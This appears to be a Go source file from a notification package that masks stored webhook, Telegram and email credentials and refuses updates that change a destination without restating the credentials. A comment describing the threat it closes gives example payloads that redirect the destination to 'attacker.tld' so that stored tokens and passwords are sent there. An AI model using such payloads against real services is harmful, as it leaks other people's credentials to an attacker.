package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of a masked value. When the API echoes
// credentials, it replaces the real content with a value carrying this prefix, and
// when the update endpoint receives a value with this prefix it understands it as
// "keep the original value in the DB unchanged".
//
// A prefix is used rather than an empty string or a fixed constant so that a little
// identifying information can be carried along (see MaskedValue), letting users tell
// "which bot this is" without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original is too short, so no hint is given
//	"__masked__:…ab12cd"      the last 6 characters of the original as an identifying hint
//
// Exposing only the last 6 characters is a deliberate choice: the identifying part of
// a Webhook URL is the last segment (e.g. the WeCom key, the Feishu bot id), while the
// prefix is the same for every bot and has no identifying value. The last 6
// characters are not enough to recover the credential, but enough for the person
// configuring it to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unmodified after the API
// echoed it).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the configuration with the channel's credential fields
// replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original configuration
// — better to let the UI show "configuration unavailable" than to spit back the whole
// raw content, which may contain credentials, when the channel type is unrecognized.
// Non-credential fields are kept as-is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures such as headers are treated as a single credential as a whole:
		// judging each sub-key individually would require every channel to declare yet
		// another set of "which sub-keys are credentials" rules, which costs far more than
		// it is worth.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed, but the
// caller did not state the credential fields". It is returned instead of silently
// allowing the update or silently dropping the credentials; see PrepareConfigUpdate
// for the reasons.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys not explicitly stated
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 변경되었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, ", ") + ")를 함께 다시 입력하세요: 새 값을 넣거나, 비워 두어 더는 자격 증명이 필요 없음을 표시하세요. " +
		"기존 자격 증명은 이전 주소에만 유효하므로, 그대로 사용하면 새 주소에 넘겨주는 셈입니다."
}

// PrepareConfigUpdate merges a channel configuration and handles the
// security-sensitive case of a "destination change".
//
// It replaces a bare MergeConfig on the channel update path, and closes the following
// path, verified to work in practice: the destination (where messages go) and the
// credentials (which identity sends them) are two independent sets of fields, and
// MergeConfig always keeps the DB's original value for "keys not mentioned". So
// anyone able to PATCH a channel could, simply by **changing only the destination
// and saying nothing about the credentials**, make the server send the real
// credentials stored in the DB to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over the username and password after STARTTLS
//
// This path is completely silent and does not depend on redirects (so refusing
// cross-host redirects does not stop it), and it directly defeats the goal of this
// package's masking mechanism — "credentials are never echoed to the browser".
//
// Rule: as soon as any destination key is changed to a new value, the caller must
// explicitly state **every** credential key:
//   - provide a new value → the new value is used
//   - explicitly pass an empty string → the field no longer needs a credential
//     (preserving the clearing semantics)
//   - pass the masked value back unchanged / don't mention the key at all → rejected
//
// The third case is also rejected because the meaning of a "masked value" is exactly
// "keep using the old credential", and the old credential is valid only for the old
// destination. Automatically dropping the credentials is deliberately not done here
// — for optional credential fields (webhook headers, email password) that would
// silently turn into "authentication is gone but the API returns 200", which is
// harder to troubleshoot than an error. Better to make the operator fill it in once
// more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("등록되지 않은 채널 유형입니다: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook headers, which is an object) has a
	// masked literal embedded in it, the caller has stuffed the "keep the original value"
	// sentinel inside a structure. MergeConfig recognizes only "a string with the prefix"
	// as masked, so this shape would be stored as an ordinary object — the literal
	// "__masked__" would actually be persisted to the DB, and subsequent authentication
	// would silently fail with no error at all. Better to reject it.
	//
	// This check must come **first**: when the destination has not changed there is an
	// early return, so placing it later would cover only the "destination changed" path
	// (the first version placed it wrong exactly like that, and the tests caught it
	// immediately).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value means
	// "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The destination did not change, so do a normal merge (masked values keep the
		// original, empty strings clear, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// The destination changed: require every credential key to be explicitly stated.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the masking sentinel inside
// a non-string structure.
//
// The masking mechanism presumes that "the whole value is a single string". An object
// field like webhook headers can only be masked as a whole (written as the string
// "__masked__") or submitted as a whole; stuffing the sentinel inside the object
// neither expresses "keep unchanged" nor avoids being stored in the DB as a real
// value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("%s 필드의 내용에 마스킹 표시(%q)가 들어 있습니다. 이 필드는 전체를 비워 두어 기존 값을 유지하거나 전체를 새 값으로 제출해야 하며, 구조체 내부에 마스킹 표시를 끼워 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. Comparing via
// JSON serialization also handles type differences along the way — the port the
// frontend submits is a number while the value read back from the DB is a float64,
// so a direct == would misjudge.
//
// "Empty" must be normalized before comparing: an empty string and "key absent" are
// the same state in this config model, because MergeConfig treats an empty string as
// an explicit clear and deletes the key outright. Without normalization, an optional
// destination field that is always left blank (Telegram's base_url is the only such
// field: leaving it blank uses the official URL) would go down this path —
//
//	created with base_url:"" stored  →  the first save has the key deleted by MergeConfig
//	→ on the second save incoming is "" and stored lacks the key, judged as "destination changed"
//	→ the credential is a masked value → 400 "destination changed, please re-enter the credential fields as well"
//
// From then on every save would fail unless the user re-pasted the Bot Token, even
// though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "empty".
// The criterion must match MergeConfig's clearing check (strings.TrimSpace(s) == ""),
// otherwise a gap appears where "MergeConfig thinks it should be deleted but
// sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating a channel configuration.
//
// Rules:
//   - keys in incoming whose value is masked → keep stored's original value (the user
//     did not change this field)
//   - keys in incoming whose value is an empty string → treated as an explicit clear;
//     the key is deleted
//   - other keys → overwritten with incoming's value
//   - keys present in stored but not in incoming → kept (partial-update semantics)
//
// Whether an empty string counts as "clear" needs to be explicit: the frontend form
// submits unfilled fields as empty strings, and if those were written as valid values
// they would actually clear fields that were "left blank to keep the original value".
// Explicit clearing is chosen here because when users need to clear a misconfigured
// field, they have no other way to express it (dropping the field could distinguish
// "not provided" from "provided empty", but the UI does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
